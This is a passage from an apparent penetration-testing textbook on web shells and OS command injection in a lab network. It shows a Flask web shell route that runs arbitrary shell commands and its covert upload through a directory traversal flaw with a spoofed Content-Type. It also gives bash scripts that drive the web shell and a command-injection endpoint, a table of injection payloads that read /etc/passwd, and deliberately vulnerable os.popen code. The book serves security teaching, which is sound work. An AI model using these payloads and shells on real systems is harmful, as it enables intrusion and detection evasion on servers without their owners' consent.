<h3 class="H2" id="sec11"><span id="h2-88"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Uploading Malicious Payloads</span></h3>&#13;
<p class="TNI1">Now that we know we can exploit a directory traversal vulnerability, let’s stage a malicious <i>app.py</i> payload. We’ll use the <span class="SANS_TheSansMonoCd_W5Regular_11">@app.route()</span> function to include a new web shell endpoint in <i>p-web-01</i>. Download the malicious version of the <i>app.py</i> file from the book’s GitHub repository.</p>&#13;
<p class="TX">When you open this file, you’ll see that it’s pretty much a direct copy of the original <i>app.py</i> file. However, we’ve added another route to the bottom of the file:</p>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">app.py</span></p>&#13;
<pre class="pre"><code><var>--snip--</var>&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> @app.route('/webshell/&lt;command&gt;')&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_131" aria-label="131"/>def webshell(command):&#13;
    result = subprocess.check_output(command, shell=True)&#13;
    return result.decode('utf-8')&#13;
</code></pre>&#13;
<p class="TX">The line at <span class="CodeAnnotation" aria-label="annotation1">❶</span> appends a new <i>/webshell/&lt;command&gt;</i> URL, which executes the <span class="SANS_TheSansMonoCd_W5Regular_11">webshell()</span> function. This function accepts a command as a parameter. The rest of the file looks very similar to the <i>python-webshell-check.py</i> file.</p>&#13;
<p class="TX">Let’s upload this web shell to <i>p-web-01</i> by using Burp Suite. First, exploit the directory traversal vulnerability by renaming the filename in the request to <i>../app.py</i>. Doing this should allow us to overwrite the original <i>app.py</i> file on the server.</p>&#13;
<p class="TX">The next step is to change the request’s <span class="SANS_TheSansMonoCd_W5Regular_11">Content-Type</span> header to trick the server into thinking we’re uploading an image. Modify the header to include the <span class="SANS_TheSansMonoCd_W5Regular_11">image/jpeg</span> content type. Then paste the content of the malicious file into the request’s body. Before clicking <b>Send</b>, make sure your request looks like the one in <a href="chapter6.xhtml#fig6-11">Figure 6-11</a>. (Keep in mind that this screenshot does not display the entirety of the file’s contents in the request body.)</p>&#13;
<figure class="IMG"><img id="fig6-11" class="img1" src="../images/pg131.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-11: Uploading the malicious</span> <span class="SANS_Futura_Std_Book_11">app.py</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">file containing a web shell route</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">If the request worked, you should get a <span class="SANS_TheSansMonoCd_W5Regular_11">File upload was successful!</span> message.</p>&#13;
<p class="TX">Note that the exploit preserved all the <i>app.py</i> file’s original functionality. This undercover web shell exploitation helps us evade detection, since we kept the site’s core behavior intact and didn’t create any new files. An analyst reviewing the <i>/uploads</i> directory won’t find a web shell, as we added the shell to the web application’s source code. However, security systems such as <i>file integrity monitoring (FIM)</i> may catch that a file’s hash was changed.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_132" aria-label="132"/>In real-world scenarios, be very careful when attempting to overwrite an application. It may not always work on the first attempt, and you could break the application if a code error exists in the modified version. Always seek authorization when attempting dangerous penetration-testing techniques.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h2 class="H1" id="sec12"><span id="h1-43"/><span class="SANS_Futura_Std_Bold_B_11">Executing Web Shell Commands</span></h2>&#13;
<p class="TNI1">After chaining together three separate vulnerabilities, we can now execute commands on <i>p-web-01</i>. To do this, navigate to the endpoint you just created and append a bash command to the URL. The command’s output should be returned in the browser response.</p>&#13;
<p class="TX">For example, to figure out what user we’re operating as, run the <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> command by navigating to <i>http://172.16.10.10:8081/webshell/id</i>. This should produce the following output:</p>&#13;
<pre><code>uid=0(root) gid(root) groups=0(root)</code></pre>&#13;
<p class="TX">Navigate to <i>http://172.16.10.10:8081/webshell/pwd</i> to figure out where we are on the system:</p>&#13;
<pre><code>/app</code></pre>&#13;
<p class="TX">Finally, navigate to <i>http://172.16.10.10:8081/webshell/uname%20-a</i> to identify the operating system we just compromised:</p>&#13;
<pre><code>Linux p-web-01.acme-hyper-branding.com 6.1.x-kali5-amd64 #1 SMP&#13;
PREEMPT_DYNAMIC Debian 6.1.xx-1kali1 x86_64 x86_64 x86_64 GNU/Linux&#13;
</code></pre>&#13;
<p class="TX">Note that when we sent this <span class="SANS_TheSansMonoCd_W5Regular_11">uname -a</span> bash command to the web shell, we had to URL-encode the space character by using the <span class="SANS_TheSansMonoCd_W5Regular_11">%20</span> representation. <a href="chapter6.xhtml#tab6-1">Table 6-1</a> displays some commonly used URL-encoded characters you can insert into bash web shells.</p>&#13;
<p class="TT" id="tab6-1"><span class="Heavy"><span class="SANS_Futura_Std_Heavy_B_11">Table 6-1:</span></span> <span class="SANS_Futura_Std_Book_11">Common URL-Encoded Characters for Bash Web Shells</span></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Character</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">URL encoding</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Space ()</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%20</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Forward slash (</span><span class="SANS_TheSansMonoCd_W5Regular_11">/</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%2F</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Question mark (</span><span class="SANS_TheSansMonoCd_W5Regular_11">?</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%3F</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Ampersand (</span><span class="SANS_TheSansMonoCd_W5Regular_11">&amp;</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%26</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Equal sign (</span><span class="SANS_TheSansMonoCd_W5Regular_11">=</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%3D</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Colon (</span><span class="SANS_TheSansMonoCd_W5Regular_11">:</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%3A</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Semicolon (</span><span class="SANS_TheSansMonoCd_W5Regular_11">;</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%3B</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Hash (</span><span class="SANS_TheSansMonoCd_W5Regular_11">#</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%23</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Plus sign (</span><span class="SANS_TheSansMonoCd_W5Regular_11">+</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%2B</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Comma (</span><span class="SANS_TheSansMonoCd_W5Regular_11">,</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">%2C</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_133" aria-label="133"/>Now that we have an initial foothold on the server, let’s develop a unique bash script that we can use to better interface with it, so we don’t have to use the browser.</p>&#13;
<p class="HeadAExercise"><span id="exe-8"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 8: Building a Web Shell Interface</span></p>&#13;
<p class="TNI1">In this exercise, you’ll develop a bash script you can use to automatically send commands to the web shell you uploaded to <i>p-web-01</i> (172.16.10.10) and then parse the output you receive. The script should interact with the web shell by sending HTTP requests that were generated based on bash commands entered at a local bash input prompt.</p>&#13;
<p class="TX">The commands may use special characters, so you’ll need to ensure that you properly encode all inputs. You’ll also want to return clean output that contains only the relevant command execution response. <a href="chapter6.xhtml#Lis6-1">Listing 6-1</a> shows an example of such a web shell script.</p>&#13;
<span id="Lis6-1"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">webshell.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> read -p 'Host: ' host&#13;
read -p 'Port: ' port&#13;
&#13;
while true; do&#13;
  read -p '$ ' raw_command&#13;
<span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> command=$(printf %s "${raw_command}" | jq -sRr @uri)&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> response=$(curl -s -w "%{http_code}" \&#13;
  -o /dev/null "http://${host}:${port}/webshell/${command}")&#13;
  http_code=$(tail -n1 &lt;&lt;&lt; "$response")&#13;
&#13;
  # Check if the HTTP status code is a valid integer.&#13;
  if [["${http_code}" =~ ^[0-9]+$]]; then&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> if ["${http_code}" -eq 200]; then&#13;
    <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> curl "http://${host}:${port}/webshell/${command}"&#13;
    else&#13;
      echo "Error: HTTP status code ${http_code}"&#13;
    fi&#13;
  else&#13;
    echo "Error: Invalid HTTP status code received"&#13;
  fi&#13;
done&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 6-1: A web shell interface</span></p>&#13;
<p class="TX">We begin the script by collecting the host address and port for the remote target to which we want to connect <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Inside a <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop, the script asks the user to enter a command to execute <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We encode the command string by using jq and its built-in <span class="SANS_TheSansMonoCd_W5Regular_11">@uri</span> function, which converts the input string to a URI-encoded string.</p>&#13;
<p class="TX">Next, we send the target a specially crafted <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> request <span class="CodeAnnotation" aria-label="annotation3">❸</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">-s</span> option suppresses any unnecessary <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> output that isn’t directly related to the bash command. Next, the <span class="SANS_TheSansMonoCd_W5Regular_11">-w</span> argument specifies a custom output format <span role="doc-pagebreak" epub:type="pagebreak" id="pg_134" aria-label="134"/>for <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>. In this case, <span class="SANS_TheSansMonoCd_W5Regular_11">"%{http_code}"</span> is a placeholder that will be replaced with the request’s HTTP response code. This allows us to retrieve the status code separately. Also, we can see that this <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> request uses the <span class="SANS_TheSansMonoCd_W5Regular_11">-o</span> output argument and points it to <i>/dev/null</i>, meaning we discard the response body.</p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation4">❹</span>, we check whether the HTTP status code is 200. We then send a second <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> request to retrieve the output at <span class="CodeAnnotation" aria-label="annotation5">❺</span>.</p>&#13;
<p class="TX">Can you further improve this script? Try implementing some of the following features:</p>&#13;
<p class="RunInPara1"><b>Using a single HTTP request </b>Remove the need to send two <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> requests for each command.</p>&#13;
<p class="RunInPara"><b>Changing directory persistence </b>When using <span class="SANS_TheSansMonoCd_W5Regular_11">cd</span> to move around the filesystem, have your script keep track of the present working directory.</p>&#13;
<p class="RunInPara"><b>Creating a history audit log </b>When commands are sent to the web shell, store them in a log that remembers which commands were executed and when.</p>&#13;
<p class="RunInPara2"><b>Using a quick access alias </b>Instead of requiring users to manually type the target host and port in the script, accept these parameters as command line arguments and then store the full script path with these arguments as an alias.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h2 class="H1" id="sec13"><span id="h1-44"/><span class="SANS_Futura_Std_Bold_B_11">Limitations of Web Shells</span></h2>&#13;
<p class="TNI1">Despite their usefulness, web shells have several limitations. Here we discuss some of their common downsides.</p>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
<h3 class="H2" id="sec14"><span id="h2-89"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Lack of Persistence</span></h3>&#13;
<p class="TNI1">Web shells are often temporary, existing only as long as the compromised web server remains accessible. System administrators may regularly monitor and clean up uploaded files, reducing their persistence and effectiveness. Also, if the server is taken down, patched, or reconfigured, the web shell may become ineffective, reducing your ability to maintain access.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
<h3 class="H2" id="sec15"><span id="h2-90"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Lack of Real-Time Responses</span></h3>&#13;
<p class="TNI1">Real-time responses from commands such as a <span class="SANS_TheSansMonoCd_W5Regular_11">ping</span> won’t work, and unless you limit the number of <span class="SANS_TheSansMonoCd_W5Regular_11">ping</span> commands you send, your web shell may hang, as hotkeys like <small>CTRL</small>-C to exit the command won’t be available.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h2-91"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Limited Functionality</span></h3>&#13;
<p class="TNI1">Web shells often provide limited feedback or error messages, making it challenging to troubleshoot issues or understand the underlying cause of failures. They provide only a subset of the functionality available through native system administrative tools and may lack advanced bash features, such as key bindings.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_135" aria-label="135"/>We’ve considered one way of gaining initial access to a target server. Let’s end this chapter by considering an additional method: OS command injection.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h2 class="H1" id="sec17"><span id="h1-45"/><span class="SANS_Futura_Std_Bold_B_11">OS Command Injection</span></h2>&#13;
<p class="TNI1"><i>OS command injection</i> is a type of security vulnerability that occurs when an application allows users to execute unauthorized operating system commands by supplying them as input to the application. As attackers, we can exploit a target’s lack of proper input sanitization to inject these malicious commands and gain an initial foothold into systems.</p>&#13;
<p class="TX">Unlike web shells, OS command injection attacks don’t require us to upload malicious files to a server. Instead, we must identify places in the target application that rely directly on user input to construct operating system commands. Then, we must manipulate the user-supplied input by injecting specially crafted characters or sequences into them to break out of the intended input context and run our own commands.</p>&#13;
<p class="TX">For example, the following is a snippet from a Python web application that allows users to submit a filename for processing:</p>&#13;
<pre><code>import os&#13;
&#13;
def process_file(filename):&#13;
    <b>command = "ls -l " + filename</b>&#13;
    output = os.popen(command).read()&#13;
    return output&#13;
</code></pre>&#13;
<p class="TX">As you can see, the application’s <span class="SANS_TheSansMonoCd_W5Regular_11">process_file()</span> function takes the <span class="SANS_TheSansMonoCd_W5Regular_11">filename</span> parameter and passes it to the <span class="SANS_TheSansMonoCd_W5Regular_11">ls -l</span> operating system command without first checking the input for special characters or other malicious content.</p>&#13;
<p class="TX">An attacker can exploit this vulnerability if the value to <span class="SANS_TheSansMonoCd_W5Regular_11">filename</span> comes from a different function that accepts untrusted user input; in that case, they could inject additional commands into the <span class="SANS_TheSansMonoCd_W5Regular_11">filename</span> parameter. For instance, if an attacker submitted a malicious <span class="SANS_TheSansMonoCd_W5Regular_11">filename</span> input, such as <span class="SANS_TheSansMonoCd_W5Regular_11">file.txt;</span> <span class="SANS_TheSansMonoCd_W5Regular_11">id</span>, the application would construct the following command:</p>&#13;
<pre><code>ls -l file.txt; id</code></pre>&#13;
<p class="TX">This input would first execute the intended <span class="SANS_TheSansMonoCd_W5Regular_11">ls -l</span> command by using the parameter <span class="SANS_TheSansMonoCd_W5Regular_11">file.txt</span>, then run the injected <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> command.</p>&#13;
<p class="TX">Notice that the input relies on the semicolon bash control operator (<span class="SANS_TheSansMonoCd_W5Regular_11">;</span>) to escape the intended input context. In <span class="Xref">Chapters 1</span> and <span class="Xref">2</span>, you learned about several of these operators, which hold special meanings to the bash interpreter. <a href="chapter6.xhtml#tab6-2">Table 6-2</a> illustrates how to use these operators as a way to test for possible OS command injection vulnerabilities.</p>&#13;
<p class="TT" id="tab6-2"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_136" aria-label="136"/><span class="Heavy"><span class="SANS_Futura_Std_Heavy_B_11">Table 6-2:</span></span> <span class="SANS_Futura_Std_Book_11">Common OS Command Injection Techniques</span></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Operator</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Description</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Example usage</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Semicolon (</span><span class="SANS_TheSansMonoCd_W5Regular_11">;</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Executes multiple commands in a single line</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename=abc.txt; id</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Pipe (</span><span class="SANS_TheSansMonoCd_W5Regular_11">|</span><span class="SANS_Futura_Std_Book_11">) or double pipe (</span><span class="SANS_TheSansMonoCd_W5Regular_11">||</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Chains commands and redirects command output, as well as provides OR conditional logic</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename=abd.txt | cat /etc/passwd</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Ampersand (</span><span class="SANS_TheSansMonoCd_W5Regular_11">&amp;</span><span class="SANS_Futura_Std_Book_11">) or double ampersand (</span><span class="SANS_TheSansMonoCd_W5Regular_11">&amp;&amp;</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Concatenates commands or runs them in the background, as well as provides AND conditional logic</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename=abc.txt &amp; ls -l</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Command substitution (</span><span class="SANS_TheSansMonoCd_W5Regular_11">`</span><span class="SANS_Futura_Std_Book_11">,</span> <span class="SANS_TheSansMonoCd_W5Regular_11">$()</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Substitutes commands</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename=`cat /etc/passwd`</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Redirection operators (</span><span class="SANS_TheSansMonoCd_W5Regular_11">&gt;</span><span class="SANS_Futura_Std_Book_11">,</span> <span class="SANS_TheSansMonoCd_W5Regular_11">&gt;&gt;</span><span class="SANS_Futura_Std_Book_11">,</span> <span class="SANS_TheSansMonoCd_W5Regular_11">&lt;</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Redirects input/output</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename=abc; cat /etc/passwd &gt; pass.txt</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Double and single quotes (</span><span class="SANS_TheSansMonoCd_W5Regular_11">"</span><span class="SANS_Futura_Std_Book_11">,</span> <span class="SANS_TheSansMonoCd_W5Regular_11">'</span><span class="SANS_Futura_Std_Book_11">)</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Encapsulates command arguments</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">filename="abc.txt; id"</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">Let’s exploit an OS command injection vulnerability in the lab. Instead of using special hacking tools to find the vulnerability, we’ll lean on our understanding of bash syntax.</p>&#13;
<p class="TX">We’ll target the <i>p-web-02</i> web application located at <i>http://172.16.10.12</i>. When scanning this application in <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span>, we noticed two interesting endpoints: the <i>donate.php</i> file and the <i>amount_to_donate.txt</i> file.</p>&#13;
<p class="TX">Take a look at the <i>donate.php</i> web page by browsing to <i>http://172.16.10.12/donate.php</i>. As shown in <a href="chapter6.xhtml#fig6-12">Figure 6-12</a>, the page appears to contain a simple form with a text input field and a submission button.</p>&#13;
<figure class="IMG"><img id="fig6-12" class="img1" src="../images/pg136.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-12: The donate page on the</span> <span class="SANS_Futura_Std_Book_11">p-web-02</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">application</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">By performing manual testing, we’ll get a better idea of how this application functions. Try entering <b>1</b> in the text input field, then submit it (<a href="chapter6.xhtml#fig6-13">Figure 6-13</a>).</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_137" aria-label="137"/>&#13;
<figure class="IMG"><img id="fig6-13" class="img1" src="../images/pg137-1.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-13: A successful donation response</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">As you can see, it looks like the input we entered is displayed in the response message shown on the page. Notice how the URL of the page changed to include an <span class="SANS_TheSansMonoCd_W5Regular_11">amount</span> parameter that is equal to <span class="SANS_TheSansMonoCd_W5Regular_11">1</span>.</p>&#13;
<p class="TX">Now, take a look at the <i>amount_to_donate.txt</i> file by browsing to <i>http://172.16.10.12/amount_to_donate.txt</i>. You should see that the <span class="SANS_TheSansMonoCd_W5Regular_11">1</span> value we previously entered from the <i>donate.php</i> form was saved to this <i>.txt</i> file on the server. This indicates that some type of filesystem processing is being executed on the server, based on input from the web application, and that the form we discovered might be a good entry point for injected OS commands.</p>&#13;
<p class="TX">Let’s attempt to perform OS command injection in the <i>donate.php</i> page. Submit the semicolon control operator (<span class="SANS_TheSansMonoCd_W5Regular_11">;</span>) as well as the bash command <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> in the form. Unfortunately, a validation script seems to catch the semicolon character. You should see the message <i>Character ; is not allowed</i> displayed on the web page.</p>&#13;
<p class="TX">Not to worry; we can try a different method. Let’s inject a pipe character (<span class="SANS_TheSansMonoCd_W5Regular_11">|</span>) instead of a semicolon. As you can see in <a href="chapter6.xhtml#fig6-14">Figure 6-14</a>, the input is accepted.</p>&#13;
<figure class="IMG"><img id="fig6-14" class="img1" src="../images/pg137-2.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-14: A successful OS command injection response</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">If you check the <i>amounts_to_donate.txt</i> file, you should see evidence that the command was successfully injected into the file, as we’re able to identify the output of running the <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> command. In <a href="chapter6.xhtml#fig6-15">Figure 6-15</a>, you can see that the <i>www-data</i> user is running the <i>p-web-02</i> (172.16.10.12) web application.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_138" aria-label="138"/>&#13;
<figure class="IMG"><img id="fig6-15" class="img7" src="../images/pg138.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 6-15: The injected command’s output</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Using the browser’s Inspect tool or a Burp Suite proxy, we can see that the OS command injection occurs by sending a GET request to <i>/donate.php?amount=</i>.</p>&#13;
<p class="HeadAExercise"><span id="exe-9"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 9: Building a Command Injection Interface</span></p>&#13;
<p class="TNI1">Like the web shell interface you built in Exercise 8, develop a bash script that makes it easier to send commands to <i>p-web-02</i> by exploiting its OS command injection vulnerability.</p>&#13;
<p class="TX">This interface script should interact with the <i>donate.php</i> endpoint for sending commands as well as the <i>amount_to_donate.txt</i> endpoint for parsing and displaying the response of your commands. The script should also return only the response from the current command, not a full dump of all the previous command results in the <i>amount_to_donate.txt</i> file.</p>&#13;
<p class="TX"><a href="chapter6.xhtml#Lis6-2">Listing 6-2</a> shows an example solution.</p>&#13;
<span id="Lis6-2"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">os-command -injection.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
&#13;
read -rp 'Host: ' host&#13;
read -rp 'Port: ' port&#13;
&#13;
while true; do&#13;
  read -rp '$ ' raw_command&#13;
  command=$(printf %s "${raw_command}" | jq -sRr @uri)&#13;
&#13;
  # Store the previous list of command outputs.&#13;
<span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")&#13;
&#13;
  # Execute the OS Command Injection vulnerability.&#13;
<span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"&#13;
&#13;
  # Store the new list of command outputs.&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")&#13;
&#13;
  # Extract only the difference between the two command outputs.&#13;
<span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> delta=$(diff --new-line-format="%L" \&#13;
                       --unchanged-line-format="" \&#13;
                       &lt;(echo "${prev_resp}") &lt;(echo "${new_resp}"))&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_139" aria-label="139"/>  # Output the command result.&#13;
  echo "${delta}"&#13;
&#13;
done&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 6-2: An OS command injection interface</span></p>&#13;
<p class="TX">The code begins much like the web shell interface script: by collecting target connection details and beginning a <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop that prompts the user for commands to encode.</p>&#13;
<p class="TX">Before sending the OS command injection request, the script first needs to take a snapshot of the <i>amount_to_donate.txt</i> file’s contents and save it to a variable called <span class="SANS_TheSansMonoCd_W5Regular_11">prev_resp</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. We’ll discuss why we’re doing this shortly.</p>&#13;
<p class="TX">Within the next <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> request, we inject the <span class="SANS_TheSansMonoCd_W5Regular_11">amount</span> parameter with the encoded command and prepend the <span class="SANS_TheSansMonoCd_W5Regular_11">1|</span> value to it <span class="CodeAnnotation" aria-label="annotation2">❷</span>. After sending the <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> request, we then send another snapshot request to capture the new <i>amount_to_donate.txt</i> file contents in the <span class="SANS_TheSansMonoCd_W5Regular_11">new_resp</span> variable <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
